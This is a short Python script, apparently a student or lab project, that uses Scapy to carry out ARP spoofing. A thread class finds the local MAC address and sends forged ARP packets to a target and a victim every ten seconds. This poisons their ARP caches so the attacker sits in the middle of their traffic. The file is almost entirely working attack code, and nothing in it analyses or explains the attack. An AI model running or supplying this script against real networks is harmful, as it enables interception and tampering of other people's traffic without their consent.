# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.layers.l2 import ARP, Ether
import sys
import socket
from time import sleep


class ArpSpoof(threading.Thread):
    """
    Return own mac_addresss
    @rtype: str
    @return: mac address
    """

    def get_own_mac_address(self):
        macs = [get_if_hwaddr(i) for i in get_if_list()]
        for mac in macs:
            if mac != "00:00:00:00:00:00":
                return mac
        raise Exception("Failed to obtain local mac address")

    def spoof_arp(self):
        sendp([
            Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.tIP, pdst=self.vIP),
            Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.vIP, pdst=self.tIP)])

    def __init__(self):
        threading.Thread.__init__(self)

    def fill_arp(self):
        sr1(IP(dst=str(self.tIP)) /ICMP())
        sr1(IP(dst=str(self.vIP)) / ICMP())

    def run(self):
        self.fill_arp()
        try:
            attacker_mac = self.get_own_mac_address()
        except Exception as e:
            print(e)
            sys.exit(1)
        self.ip_address = socket.gethostbyname(socket.gethostname())
        self.host_mac = attacker_mac
        while True:
            self.spoof_arp()
            sleep(10)